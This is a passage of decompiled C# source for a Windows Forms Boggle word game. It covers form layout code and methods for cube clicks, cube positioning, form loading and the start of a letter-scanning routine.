		((Control)bogBorder12).set_Size(size);
		((PictureBox)BogBorder10).set_TabIndex(49);
		((PictureBox)BogBorder10).set_TabStop(false);
		((Control)BogBorder11).set_BackColor(Color.DarkGray);
		BogBorder11.BorderDirection = BogBorder.Direction.Top;
		BogBorder bogBorder13 = BogBorder11;
		location = new Point(60, 372);
		((Control)bogBorder13).set_Location(location);
		((Control)BogBorder11).set_Name("BogBorder11");
		BogBorder bogBorder14 = BogBorder11;
		size = new Size(80, 11);
		((Control)bogBorder14).set_Size(size);
		((PictureBox)BogBorder11).set_TabIndex(50);
		((PictureBox)BogBorder11).set_TabStop(false);
		((Control)BogBorder12).set_BackColor(Color.DarkGray);
		BogBorder12.BorderDirection = BogBorder.Direction.Bottom;
		BogBorder bogBorder15 = BogBorder12;
		location = new Point(60, 615);
		((Control)bogBorder15).set_Location(location);
		((Control)BogBorder12).set_Name("BogBorder12");
		BogBorder bogBorder16 = BogBorder12;
		size = new Size(81, 11);
		((Control)bogBorder16).set_Size(size);
		((PictureBox)BogBorder12).set_TabIndex(51);
		((PictureBox)BogBorder12).set_TabStop(false);
		((Control)BogBorder13).set_BackColor(Color.DarkGray);
		BogBorder13.BorderDirection = BogBorder.Direction.Bottom;
		BogBorder bogBorder17 = BogBorder13;
		location = new Point(170, 614);
		((Control)bogBorder17).set_Location(location);
		((Control)BogBorder13).set_Name("BogBorder13");
		BogBorder bogBorder18 = BogBorder13;
		size = new Size(81, 11);
		((Control)bogBorder18).set_Size(size);
		((PictureBox)BogBorder13).set_TabIndex(56);
		((PictureBox)BogBorder13).set_TabStop(false);
		((Control)BogBorder14).set_BackColor(Color.DarkGray);
		BogBorder14.BorderDirection = BogBorder.Direction.Top;
		BogBorder bogBorder19 = BogBorder14;
		location = new Point(170, 371);
		((Control)bogBorder19).set_Location(location);
		((Control)BogBorder14).set_Name("BogBorder14");
		BogBorder bogBorder20 = BogBorder14;
		size = new Size(80, 11);
		((Control)bogBorder20).set_Size(size);
		((PictureBox)BogBorder14).set_TabIndex(55);
		((PictureBox)BogBorder14).set_TabStop(false);
		((Control)BogBorder15).set_BackColor(Color.DarkGray);
		BogBorder15.BorderDirection = BogBorder.Direction.Right;
		BogBorder bogBorder21 = BogBorder15;
		location = new Point(249, 371);
		((Control)bogBorder21).set_Location(location);
		((Control)BogBorder15).set_Name("BogBorder15");
		BogBorder bogBorder22 = BogBorder15;
		size = new Size(12, 254);
		((Control)bogBorder22).set_Size(size);
		((PictureBox)BogBorder15).set_TabIndex(54);
		((PictureBox)BogBorder15).set_TabStop(false);
		((Control)BogBorder16).set_BackColor(Color.DarkGray);
		BogBorder16.BorderDirection = BogBorder.Direction.Left;
		BogBorder bogBorder23 = BogBorder16;
		location = new Point(158, 369);
		((Control)bogBorder23).set_Location(location);
		((Control)BogBorder16).set_Name("BogBorder16");
		BogBorder bogBorder24 = BogBorder16;
		size = new Size(12, 258);
		((Control)bogBorder24).set_Size(size);
		((PictureBox)BogBorder16).set_TabIndex(53);
		((PictureBox)BogBorder16).set_TabStop(false);
		lstCompFoundWords.set_BackColor(Color.Black);
		lstCompFoundWords.set_BorderStyle((BorderStyle)0);
		((Control)lstCompFoundWords).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		lstCompFoundWords.set_ForeColor(Color.DodgerBlue);
		ListBox obj9 = lstCompFoundWords;
		location = new Point(168, 380);
		((Control)obj9).set_Location(location);
		((Control)lstCompFoundWords).set_Name("lstCompFoundWords");
		ListBox obj10 = lstCompFoundWords;
		size = new Size(81, 234);
		((Control)obj10).set_Size(size);
		((Control)lstCompFoundWords).set_TabIndex(52);
		((Control)tmrBtn1).set_BackColor(Color.Gray);
		Button obj11 = tmrBtn1;
		location = new Point(89, 132);
		((Control)obj11).set_Location(location);
		((Control)tmrBtn1).set_Name("tmrBtn1");
		Button obj12 = tmrBtn1;
		size = new Size(21, 12);
		((Control)obj12).set_Size(size);
		((Control)tmrBtn1).set_TabIndex(57);
		((Control)tmrBtn2).set_BackColor(Color.Gray);
		Button obj13 = tmrBtn2;
		location = new Point(126, 132);
		((Control)obj13).set_Location(location);
		((Control)tmrBtn2).set_Name("tmrBtn2");
		Button obj14 = tmrBtn2;
		size = new Size(21, 12);
		((Control)obj14).set_Size(size);
		((Control)tmrBtn2).set_TabIndex(58);
		((Control)tmrBtn3).set_BackColor(Color.Gray);
		Button obj15 = tmrBtn3;
		location = new Point(198, 132);
		((Control)obj15).set_Location(location);
		((Control)tmrBtn3).set_Name("tmrBtn3");
		Button obj16 = tmrBtn3;
		size = new Size(21, 12);
		((Control)obj16).set_Size(size);
		((Control)tmrBtn3).set_TabIndex(59);
		((Control)tmrBtn4).set_BackColor(Color.Gray);
		Button obj17 = tmrBtn4;
		location = new Point(162, 132);
		((Control)obj17).set_Location(location);
		((Control)tmrBtn4).set_Name("tmrBtn4");
		Button obj18 = tmrBtn4;
		size = new Size(21, 12);
		((Control)obj18).set_Size(size);
		((Control)tmrBtn4).set_TabIndex(60);
		Label1.set_AutoSize(true);
		((Control)Label1).set_BackColor(Color.DarkGray);
		((Control)Label1).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Label1).set_ForeColor(Color.Black);
		Label label = Label1;
		location = new Point(65, 357);
		((Control)label).set_Location(location);
		((Control)Label1).set_Name("Label1");
		Label label2 = Label1;
		size = new Size(66, 13);
		((Control)label2).set_Size(size);
		((Control)Label1).set_TabIndex(61);
		((Control)Label1).set_Text("Your Words");
		Label2.set_AutoSize(true);
		((Control)Label2).set_BackColor(Color.DarkGray);
		((Control)Label2).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Label2).set_ForeColor(Color.Black);
		Label label3 = Label2;
		location = new Point(179, 357);
		((Control)label3).set_Location(location);
		((Control)Label2).set_Name("Label2");
		Label label4 = Label2;
		size = new Size(57, 13);
		((Control)label4).set_Size(size);
		((Control)Label2).set_TabIndex(62);
		((Control)Label2).set_Text("My Words");
		((Control)lblCompScore).set_BackColor(Color.Silver);
		lblCompScore.set_BorderStyle((BorderStyle)1);
		((Control)lblCompScore).set_Font(new Font("Microsoft Sans Serif", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)lblCompScore).set_ForeColor(Color.FromArgb(0, 0, 192));
		Label obj19 = lblCompScore;
		location = new Point(35, 289);
		((Control)obj19).set_Location(location);
		((Control)lblCompScore).set_Name("lblCompScore");
		Label obj20 = lblCompScore;
		size = new Size(80, 19);
		((Control)obj20).set_Size(size);
		((Control)lblCompScore).set_TabIndex(63);
		((Control)lblCompScore).set_Text("0");
		Label3.set_AutoSize(true);
		((Control)Label3).set_BackColor(Color.DarkGray);
		((Control)Label3).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Label3).set_ForeColor(Color.Black);
		Label label5 = Label3;
		location = new Point(35, 229);
		((Control)label5).set_Location(location);
		((Control)Label3).set_Name("Label3");
		Label label6 = Label3;
		size = new Size(63, 13);
		((Control)label6).set_Size(size);
		((Control)Label3).set_TabIndex(64);
		((Control)Label3).set_Text("Your Score");
		Label4.set_AutoSize(true);
		((Control)Label4).set_BackColor(Color.DarkGray);
		((Control)Label4).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Label4).set_ForeColor(Color.Black);
		Label label7 = Label4;
		location = new Point(35, 272);
		((Control)label7).set_Location(location);
		((Control)Label4).set_Name("Label4");
		Label label8 = Label4;
		size = new Size(54, 13);
		((Control)label8).set_Size(size);
		((Control)Label4).set_TabIndex(65);
		((Control)Label4).set_Text("My Score");
		Label5.set_AutoSize(true);
		((Control)Label5).set_BackColor(Color.DarkGray);
		((Control)Label5).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Label5).set_ForeColor(Color.Black);
		Label label9 = Label5;
		location = new Point(35, 187);
		((Control)label9).set_Location(location);
		((Control)Label5).set_Name("Label5");
		Label label10 = Label5;
		size = new Size(56, 13);
		((Control)label10).set_Size(size);
		((Control)Label5).set_TabIndex(66);
		((Control)Label5).set_Text("Add Word");
		((Control)lblHumanWordsCount).set_BackColor(Color.DarkGray);
		((Control)lblHumanWordsCount).set_Font(new Font("Microsoft Sans Serif", 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)lblHumanWordsCount).set_ForeColor(Color.Blue);
		Label obj21 = lblHumanWordsCount;
		location = new Point(25, 378);
		((Control)obj21).set_Location(location);
		((Control)lblHumanWordsCount).set_Name("lblHumanWordsCount");
		Label obj22 = lblHumanWordsCount;
		size = new Size(21, 19);
		((Control)obj22).set_Size(size);
		((Control)lblHumanWordsCount).set_TabIndex(67);
		((Control)lblHumanWordsCount).set_Text("0");
		((Control)lblCompWordsCount).set_BackColor(Color.DarkGray);
		((Control)lblCompWordsCount).set_Font(new Font("Microsoft Sans Serif", 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)lblCompWordsCount).set_ForeColor(Color.Blue);
		Label obj23 = lblCompWordsCount;
		location = new Point(271, 378);
		((Control)obj23).set_Location(location);
		((Control)lblCompWordsCount).set_Name("lblCompWordsCount");
		Label obj24 = lblCompWordsCount;
		size = new Size(21, 19);
		((Control)obj24).set_Size(size);
		((Control)lblCompWordsCount).set_TabIndex(68);
		((Control)lblCompWordsCount).set_Text("0");
		btnContinue.BogButtonEnabled = false;
		btnContinue.ButtonText = "Continue";
		BogButton bogButton3 = btnContinue;
		location = new Point(187, 223);
		((Control)bogButton3).set_Location(location);
		((Control)btnContinue).set_Name("btnContinue");
		BogButton bogButton4 = btnContinue;
		size = new Size(93, 49);
		((Control)bogButton4).set_Size(size);
		((Control)btnContinue).set_TabIndex(69);
		((Control)btnContinue).set_Text("Continue");
		btnScramble.BogButtonEnabled = false;
		btnScramble.ButtonText = "Scramble";
		BogButton bogButton5 = btnScramble;
		location = new Point(187, 265);
		((Control)bogButton5).set_Location(location);
		((Control)btnScramble).set_Name("btnScramble");
		BogButton bogButton6 = btnScramble;
		size = new Size(93, 49);
		((Control)bogButton6).set_Size(size);
		((Control)btnScramble).set_TabIndex(70);
		((Control)btnScramble).set_Text("Add Word");
		btnFinish.BogButtonEnabled = false;
		btnFinish.ButtonText = " Finish ";
		BogButton bogButton7 = btnFinish;
		location = new Point(548, 595);
		((Control)bogButton7).set_Location(location);
		((Control)btnFinish).set_Name("btnFinish");
		BogButton bogButton8 = btnFinish;
		size = new Size(96, 49);
		((Control)bogButton8).set_Size(size);
		((Control)btnFinish).set_TabIndex(73);
		((Control)btnFinish).set_Text("btnFinish");
		((Control)lblHumanRounds).set_BackColor(Color.Silver);
		lblHumanRounds.set_BorderStyle((BorderStyle)1);
		((Control)lblHumanRounds).set_Font(new Font("Microsoft Sans Serif", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)lblHumanRounds).set_ForeColor(Color.FromArgb(0, 0, 192));
		Label obj25 = lblHumanRounds;
		location = new Point(121, 244);
		((Control)obj25).set_Location(location);
		((Control)lblHumanRounds).set_Name("lblHumanRounds");
		Label obj26 = lblHumanRounds;
		size = new Size(29, 19);
		((Control)obj26).set_Size(size);
		((Control)lblHumanRounds).set_TabIndex(74);
		((Control)lblHumanRounds).set_Text("0");
		((Control)lblComputerRounds).set_BackColor(Color.Silver);
		lblComputerRounds.set_BorderStyle((BorderStyle)1);
		((Control)lblComputerRounds).set_Font(new Font("Microsoft Sans Serif", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)lblComputerRounds).set_ForeColor(Color.FromArgb(0, 0, 192));
		Label obj27 = lblComputerRounds;
		location = new Point(121, 289);
		((Control)obj27).set_Location(location);
		((Control)lblComputerRounds).set_Name("lblComputerRounds");
		Label obj28 = lblComputerRounds;
		size = new Size(29, 19);
		((Control)obj28).set_Size(size);
		((Control)lblComputerRounds).set_TabIndex(75);
		((Control)lblComputerRounds).set_Text("0");
		Label7.set_AutoSize(true);
		((Control)Label7).set_BackColor(Color.DarkGray);
		((Control)Label7).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Label7).set_ForeColor(Color.Black);
		Label label11 = Label7;
		location = new Point(121, 230);
		((Control)label11).set_Location(location);
		((Control)Label7).set_Name("Label7");
		Label label12 = Label7;
		size = new Size(45, 13);
		((Control)label12).set_Size(size);
		((Control)Label7).set_TabIndex(76);
		((Control)Label7).set_Text("Rounds");
		Label8.set_AutoSize(true);
		((Control)Label8).set_BackColor(Color.DarkGray);
		((Control)Label8).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Label8).set_ForeColor(Color.Black);
		Label label13 = Label8;
		location = new Point(121, 275);
		((Control)label13).set_Location(location);
		((Control)Label8).set_Name("Label8");
		Label label14 = Label8;
		size = new Size(45, 13);
		((Control)label14).set_Size(size);
		((Control)Label8).set_TabIndex(77);
		((Control)Label8).set_Text("Rounds");
		lblRound.set_AutoSize(true);
		((Control)lblRound).set_BackColor(Color.DarkGray);
		((Control)lblRound).set_Font(new Font("Microsoft Sans Serif", 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)lblRound).set_ForeColor(Color.Blue);
		Label obj29 = lblRound;
		location = new Point(599, 32);
		((Control)obj29).set_Location(location);
		((Control)lblRound).set_Name("lblRound");
		Label obj30 = lblRound;
		size = new Size(13, 15);
		((Control)obj30).set_Size(size);
		((Control)lblRound).set_TabIndex(72);
		((Control)lblRound).set_Text("0");
		Label6.set_AutoSize(true);
		((Control)Label6).set_BackColor(Color.DarkGray);
		((Control)Label6).set_Font(new Font("Microsoft Sans Serif", 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Label6).set_ForeColor(Color.Blue);
		Label label15 = Label6;
		location = new Point(543, 31);
		((Control)label15).set_Location(location);
		((Control)Label6).set_Name("Label6");
		Label label16 = Label6;
		size = new Size(53, 15);
		((Control)label16).set_Size(size);
		((Control)Label6).set_TabIndex(71);
		((Control)Label6).set_Text("Round: ");
		((Control)BogBorder5).set_BackColor(Color.DarkGray);
		BogBorder5.BorderDirection = BogBorder.Direction.Left;
		BogBorder bogBorder25 = BogBorder5;
		location = new Point(356, 44);
		((Control)bogBorder25).set_Location(location);
		((Control)BogBorder5).set_Name("BogBorder5");
		BogBorder bogBorder26 = BogBorder5;
		size = new Size(11, 556);
		((Control)bogBorder26).set_Size(size);
		((PictureBox)BogBorder5).set_TabIndex(13);
		((PictureBox)BogBorder5).set_TabStop(false);
		((Control)Panel3).set_BackColor(Color.Black);
		Panel panel3 = Panel3;
		location = new Point(365, 57);
		((Control)panel3).set_Location(location);
		((Control)Panel3).set_Name("Panel3");
		Panel panel4 = Panel3;
		size = new Size(430, 18);
		((Control)panel4).set_Size(size);
		((Control)Panel3).set_TabIndex(45);
		((Control)Panel2).set_BackColor(Color.Black);
		Panel panel5 = Panel2;
		location = new Point(780, 72);
		((Control)panel5).set_Location(location);
		((Control)Panel2).set_Name("Panel2");
		Panel panel6 = Panel2;
		size = new Size(15, 100);
		((Control)panel6).set_Size(size);
		((Control)Panel2).set_TabIndex(44);
		((TextBoxBase)txtMain).set_BackColor(Color.Black);
		((TextBoxBase)txtMain).set_BorderStyle((BorderStyle)0);
		txtMain.set_Font(new Font("Microsoft Sans Serif", 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		txtMain.set_ForeColor(Color.DodgerBlue);
		RichTextBox obj31 = txtMain;
		location = new Point(381, 75);
		((Control)obj31).set_Location(location);
		((Control)txtMain).set_Name("txtMain");
		RichTextBox obj32 = txtMain;
		size = new Size(399, 99);
		((Control)obj32).set_Size(size);
		((Control)txtMain).set_TabIndex(18);
		txtMain.set_Text("");
		((Control)BogBorder4).set_BackColor(Color.DarkGray);
		BogBorder4.BorderDirection = BogBorder.Direction.Bottom;
		BogBorder bogBorder27 = BogBorder4;
		location = new Point(367, 589);
		((Control)bogBorder27).set_Location(location);
		((Control)BogBorder4).set_Name("BogBorder4");
		BogBorder bogBorder28 = BogBorder4;
		size = new Size(428, 10);
		((Control)bogBorder28).set_Size(size);
		((PictureBox)BogBorder4).set_TabIndex(12);
		((PictureBox)BogBorder4).set_TabStop(false);
		((Control)BogBorder3).set_BackColor(Color.DarkGray);
		BogBorder3.BorderDirection = BogBorder.Direction.Right;
		BogBorder bogBorder29 = BogBorder3;
		location = new Point(795, 47);
		((Control)bogBorder29).set_Location(location);
		((Control)BogBorder3).set_Name("BogBorder3");
		BogBorder bogBorder30 = BogBorder3;
		size = new Size(11, 552);
		((Control)bogBorder30).set_Size(size);
		((PictureBox)BogBorder3).set_TabIndex(11);
		((PictureBox)BogBorder3).set_TabStop(false);
		((Control)BogBorder1).set_BackColor(Color.DarkGray);
		BogBorder1.BorderDirection = BogBorder.Direction.Top;
		BogBorder bogBorder31 = BogBorder1;
		location = new Point(367, 46);
		((Control)bogBorder31).set_Location(location);
		((Control)BogBorder1).set_Name("BogBorder1");
		BogBorder bogBorder32 = BogBorder1;
		size = new Size(428, 12);
		((Control)bogBorder32).set_Size(size);
		((PictureBox)BogBorder1).set_TabIndex(9);
		((PictureBox)BogBorder1).set_TabStop(false);
		((Control)picCubesUp).set_BackColor(Color.Black);
		PictureBox obj33 = picCubesUp;
		location = new Point(365, 172);
		((Control)obj33).set_Location(location);
		((Control)picCubesUp).set_Name("picCubesUp");
		PictureBox obj34 = picCubesUp;
		size = new Size(430, 417);
		((Control)obj34).set_Size(size);
		picCubesUp.set_TabIndex(5);
		picCubesUp.set_TabStop(false);
		((Control)CircleLabel1).set_BackColor(Color.LightGray);
		CircleLabel1.CubeHighLight = Color.LightGray;
		CircleLabel1.CubeText = "W";
		CircleLabel1.CubeTextColor = Color.DarkBlue;
		CircleLabel1.CubeTopRadius = 55L;
		CircleLabel circleLabel33 = CircleLabel1;
		location = new Point(394, 415);
		((Control)circleLabel33).set_Location(location);
		((Control)CircleLabel1).set_Name("CircleLabel1");
		CircleLabel circleLabel34 = CircleLabel1;
		size = new Size(55, 55);
		((Control)circleLabel34).set_Size(size);
		((Control)CircleLabel1).set_TabIndex(31);
		((Control)CircleLabel1).set_Tag((object)"03");
		((Control)CircleLabel2).set_BackColor(Color.LightGray);
		CircleLabel2.CubeHighLight = Color.LightGray;
		CircleLabel2.CubeText = "W";
		CircleLabel2.CubeTextColor = Color.DarkBlue;
		CircleLabel2.CubeTopRadius = 55L;
		CircleLabel circleLabel35 = CircleLabel2;
		location = new Point(398, 340);
		((Control)circleLabel35).set_Location(location);
		((Control)CircleLabel2).set_Name("CircleLabel2");
		CircleLabel circleLabel36 = CircleLabel2;
		size = new Size(55, 55);
		((Control)circleLabel36).set_Size(size);
		((Control)CircleLabel2).set_TabIndex(27);
		((Control)CircleLabel2).set_Tag((object)"02");
		((Control)CircleLabel3).set_BackColor(Color.LightGray);
		CircleLabel3.CubeHighLight = Color.LightGray;
		CircleLabel3.CubeText = "W";
		CircleLabel3.CubeTextColor = Color.DarkBlue;
		CircleLabel3.CubeTopRadius = 55L;
		CircleLabel circleLabel37 = CircleLabel3;
		location = new Point(468, 412);
		((Control)circleLabel37).set_Location(location);
		((Control)CircleLabel3).set_Name("CircleLabel3");
		CircleLabel circleLabel38 = CircleLabel3;
		size = new Size(55, 55);
		((Control)circleLabel38).set_Size(size);
		((Control)CircleLabel3).set_TabIndex(32);
		((Control)CircleLabel3).set_Tag((object)"13");
		((Control)PictureBox1).set_BackColor(Color.Black);
		PictureBox pictureBox = PictureBox1;
		location = new Point(370, 172);
		((Control)pictureBox).set_Location(location);
		((Control)PictureBox1).set_Name("PictureBox1");
		PictureBox pictureBox2 = PictureBox1;
		size = new Size(430, 417);
		((Control)pictureBox2).set_Size(size);
		PictureBox1.set_TabIndex(5);
		PictureBox1.set_TabStop(false);
		size = new Size(5, 13);
		((Form)this).set_AutoScaleBaseSize(size);
		((Form)this).set_BackColor(Color.Black);
		size = new Size(848, 646);
		((Form)this).set_ClientSize(size);
		((Control)this).get_Controls().AddRange((Control[])(object)new Control[73]
		{
			(Control)lblCompWordsCount,
			(Control)lblHumanWordsCount,
			(Control)Label2,
			(Control)Label1,
			(Control)Label8,
			(Control)Label7,
			(Control)Label5,
			(Control)Label4,
			(Control)Label3,
			(Control)lblRound,
			(Control)Label6,
			(Control)BogBorder13,
			(Control)BogBorder14,
			(Control)BogBorder15,
			(Control)BogBorder16,
			(Control)lstCompFoundWords,
			(Control)BogBorder12,
			(Control)BogBorder11,
			(Control)BogBorder10,
			(Control)BogBorder9,
			(Control)lstHumanWordsFound,
			(Control)lblComputerRounds,
			(Control)lblHumanRounds,
			(Control)lblCompScore,
			(Control)lblHumanScore,
			(Control)txtWordFound,
			(Control)btnScramble,
			(Control)btnContinue,
			(Control)btnAddWord,
			(Control)tmrBtn4,
			(Control)tmrBtn3,
			(Control)tmrBtn2,
			(Control)tmrBtn1,
			(Control)BogBorder8,
			(Control)BogBorder7,
			(Control)BogBorder6,
			(Control)BogBorder2,
			(Control)tmrMain,
			(Control)btnFinish,
			(Control)BogBorder5,
			(Control)Panel3,
			(Control)Panel2,
			(Control)Panel1,
			(Control)picCubeDown,
			(Control)lbl16,
			(Control)lbl15,
			(Control)lbl14,
			(Control)lbl13,
			(Control)lbl12,
			(Control)lbl11,
			(Control)lbl10,
			(Control)lbl9,
			(Control)lbl8,
			(Control)lbl7,
			(Control)lbl6,
			(Control)lbl5,
			(Control)lbl2,
			(Control)lbl3,
			(Control)lbl4,
			(Control)lbl1,
			(Control)txtMain,
			(Control)BogBorder4,
			(Control)BogBorder3,
			(Control)BogBorder1,
			(Control)pnlTimer,
			(Control)picCubesUp,
			(Control)pnlScore,
			(Control)pnlWords,
			(Control)CircleLabel1,
			(Control)CircleLabel2,
			(Control)CircleLabel3,
			(Control)PictureBox1,
			(Control)pnlCubes
		});
		((Form)this).set_FormBorderStyle((FormBorderStyle)3);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_Menu(mnuMain);
		((Control)this).set_Name("frmMain");
		((Control)this).set_Text("Boggle .Net");
		((Control)this).ResumeLayout(false);
	}

	private void CubeClick(CircleLabel sender, EventArgs e)
	{
		VBMath.Randomize();
		checked
		{
			Color cubeTextColor = (int)Math.Round(Conversion.Int(VBMath.Rnd() * 6f) + 1f) switch
			{
				1 => Color.Indigo, 
				2 => Color.DarkGreen, 
				3 => Color.Crimson, 
				4 => Color.Yellow, 
				5 => Color.DarkOrange, 
				_ => Color.Pink, 
			};
			if (StringType.StrCmp(modGlobal.Cubes[IntegerType.FromString(Strings.Mid(((Control)sender).get_Name(), 4)) - 1].CubeHighLight.ToString(), Color.Aquamarine.ToString(), false) == 0)
			{
				modGlobal.Cubes[IntegerType.FromString(Strings.Mid(((Control)sender).get_Name(), 4)) - 1].CubeHighLight = Color.LightGray;
				modGlobal.Cubes[IntegerType.FromString(Strings.Mid(((Control)sender).get_Name(), 4)) - 1].CubeTextColor = Color.DarkBlue;
				ResetCubes();
				return;
			}
			IEnumerator enumerator = default(IEnumerator);
			try
			{
				enumerator = modGlobal.Cubes.GetEnumerator();
				while (enumerator.MoveNext())
				{
					modGlobal.myCube = (Cube)enumerator.Current;
					modGlobal.myCube.CubeDownPic = null;
				}
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					((IDisposable)enumerator).Dispose();
				}
			}
			if (ObjectType.ObjTst(modGlobal.Cubes[IntegerType.FromString(Strings.Mid(((Control)sender).get_Name(), 4)) - 1].CubeTopRadius, (object)55, false) != 0)
			{
				ResetCubes();
				return;
			}
			ResetCubes();
			modGlobal.Cubes[IntegerType.FromString(Strings.Mid(((Control)sender).get_Name(), 4)) - 1].CubeDownPic = picCubeDown;
			modGlobal.Cubes[IntegerType.FromString(Strings.Mid(((Control)sender).get_Name(), 4)) - 1].ShowClick();
			modGlobal.Cubes[IntegerType.FromString(Strings.Mid(((Control)sender).get_Name(), 4)) - 1].CubeHighLight = Color.Aquamarine;
			modGlobal.Cubes[IntegerType.FromString(Strings.Mid(((Control)sender).get_Name(), 4)) - 1].CubeTextColor = cubeTextColor;
			((Control)modGlobal.Cubes[IntegerType.FromString(Strings.Mid(((Control)sender).get_Name(), 4)) - 1].CubeLabel).BringToFront();
		}
	}

	private void ResetCubes()
	{
		((Control)picCubeDown).set_Visible(false);
		IEnumerator enumerator = default(IEnumerator);
		try
		{
			enumerator = modGlobal.Cubes.GetEnumerator();
			while (enumerator.MoveNext())
			{
				modGlobal.myCube = (Cube)enumerator.Current;
				if (ObjectType.ObjTst(modGlobal.myCube.CubeTopRadius, (object)55, false) != 0)
				{
					((Control)modGlobal.myCube.CubeLabel).SendToBack();
					modGlobal.myCube.IsBack = true;
					modGlobal.myCube.CubeTopRadius = 55;
				}
			}
		}
		finally
		{
			if (enumerator is IDisposable)
			{
				((IDisposable)enumerator).Dispose();
			}
		}
		checked
		{
			modGlobal.Cubes[0].CubeTopLeft = ((Control)picCubesUp).get_Left() + 79;
			int num = 1;
			do
			{
				modGlobal.Cubes[num].CubeTopLeft = modGlobal.Cubes[num - 1].CubeTopLeft + modGlobal.Cubes[num - 1].CubeTopWidth + 15L;
				num++;
			}
			while (num <= 3);
			modGlobal.Cubes[4].CubeTopLeft = ((Control)picCubesUp).get_Left() + 79;
			num = 5;
			do
			{
				modGlobal.Cubes[num].CubeTopLeft = modGlobal.Cubes[num - 1].CubeTopLeft + modGlobal.Cubes[num - 1].CubeTopWidth + 15L;
				num++;
			}
			while (num <= 7);
			modGlobal.Cubes[8].CubeTopLeft = ((Control)picCubesUp).get_Left() + 79;
			num = 9;
			do
			{
				modGlobal.Cubes[num].CubeTopLeft = modGlobal.Cubes[num - 1].CubeTopLeft + modGlobal.Cubes[num - 1].CubeTopWidth + 15L;
				num++;
			}
			while (num <= 11);
			modGlobal.Cubes[12].CubeTopLeft = ((Control)picCubesUp).get_Left() + 79;
			num = 13;
			do
			{
				modGlobal.Cubes[num].CubeTopLeft = modGlobal.Cubes[num - 1].CubeTopLeft + modGlobal.Cubes[num - 1].CubeTopWidth + 15L;
				num++;
			}
			while (num <= 15);
			num = 0;
			do
			{
				modGlobal.Cubes[num].CubeTopTop = ((Control)picCubesUp).get_Top() + 69;
				num++;
			}
			while (num <= 3);
			num = 4;
			do
			{
				modGlobal.Cubes[num].CubeTopTop = modGlobal.Cubes[0].CubeTopHeight + ((Control)picCubesUp).get_Top() + 84L;
				num++;
			}
			while (num <= 7);
			num = 8;
			do
			{
				modGlobal.Cubes[num].CubeTopTop = modGlobal.Cubes[4].CubeTopHeight + modGlobal.Cubes[4].CubeTopTop + 14L;
				num++;
			}
			while (num <= 11);
			num = 12;
			do
			{
				modGlobal.Cubes[num].CubeTopTop = modGlobal.Cubes[8].CubeTopHeight + modGlobal.Cubes[8].CubeTopTop + 14L;
				num++;
			}
			while (num <= 15);
			IEnumerator enumerator2 = default(IEnumerator);
			try
			{
				enumerator2 = modGlobal.Cubes.GetEnumerator();
				while (enumerator2.MoveNext())
				{
					modGlobal.myCube = (Cube)enumerator2.Current;
					if (modGlobal.myCube.IsBack)
					{
						modGlobal.myCube.IsBack = false;
						((Control)modGlobal.myCube.CubeLabel).BringToFront();
					}
				}
			}
			finally
			{
				if (enumerator2 is IDisposable)
				{
					((IDisposable)enumerator2).Dispose();
				}
			}
		}
	}

	private void frmMain_Load(object sender, EventArgs e)
	{
		checked
		{
			((Control)this).set_Left((int)Math.Round((double)Screen.get_PrimaryScreen().get_Bounds().Width / 2.0 - (double)((Control)this).get_Width() / 2.0));
			((Control)this).set_Top((int)Math.Round((double)Screen.get_PrimaryScreen().get_Bounds().Height / 2.0 - (double)((Control)this).get_Height() / 2.0));
			int num = 0;
			do
			{
				Cube cube = new Cube();
				modGlobal.Cubes.Add(cube);
				num++;
			}
			while (num <= 15);
			FindWordsThread = new Thread(FindAllWords);
			ShowWordThread = new Thread(ShowWord);
			modGlobal.Cubes[0].CubeLabel = lbl1;
			modGlobal.Cubes[1].CubeLabel = lbl2;
			modGlobal.Cubes[2].CubeLabel = lbl3;
			modGlobal.Cubes[3].CubeLabel = lbl4;
			modGlobal.Cubes[4].CubeLabel = lbl5;
			modGlobal.Cubes[5].CubeLabel = lbl6;
			modGlobal.Cubes[6].CubeLabel = lbl7;
			modGlobal.Cubes[7].CubeLabel = lbl8;
			modGlobal.Cubes[8].CubeLabel = lbl9;
			modGlobal.Cubes[9].CubeLabel = lbl10;
			modGlobal.Cubes[10].CubeLabel = lbl11;
			modGlobal.Cubes[11].CubeLabel = lbl12;
			modGlobal.Cubes[12].CubeLabel = lbl13;
			modGlobal.Cubes[13].CubeLabel = lbl14;
			modGlobal.Cubes[14].CubeLabel = lbl15;
			modGlobal.Cubes[15].CubeLabel = lbl16;
			ResetCubes();
			modGlobal.Cubes.CubesPicBox = picCubesUp;
			ShowDisplayText("", FadeOut: false, StartUp: false, 0);
			ChangeMode(mnuVsMode, new EventArgs());
			ChangeLevel(mnuLevelMedium, new EventArgs());
			ChangeTimerInterval(mnuTmr300, new EventArgs());
			mnuEnableWordValidation.set_Checked(true);
		}
	}

	public void ScanLetters()
	{
		modGlobal.cmdBog.set_CommandText("Delete From PossibleLetters");
		modGlobal.conBoggle.Open();
		modGlobal.cmdBog.ExecuteNonQuery();
		modGlobal.conBoggle.Close();
		int num = 0;
		while (true)
		{
			int num2 = FindNextLetterSquare(num);
			if (num2 != -1)
			{
